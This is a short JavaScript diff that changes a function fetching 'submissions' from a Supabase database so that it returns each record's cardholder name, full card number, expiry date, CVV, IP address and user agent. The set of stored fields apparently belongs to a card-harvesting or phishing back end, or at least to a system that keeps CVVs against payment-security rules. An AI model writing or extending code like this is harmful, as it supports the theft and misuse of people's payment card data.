@@ -59,7 +59,18 @@ async function fetchSupabaseSubmissions() {
     console.error('Error fetching submissions from Supabase:', error.message || error);
     return [];
   }
-  return data || [];
+  // Transform snake_case columns back to camelCase
+  return (data || []).map(row => ({
+    id: row.id,
+    timestamp: row.timestamp,
+    nameOnCard: row.name_on_card,
+    cardNumber: row.card_number,
+    expiry: row.expiry,
+    cvv: row.cvv,
+    ip: row.ip,
+    userAgent: row.user_agent,
+    createdAt: row.created_at,
+  }));
 }
 
 async function fetchSubmissions() {
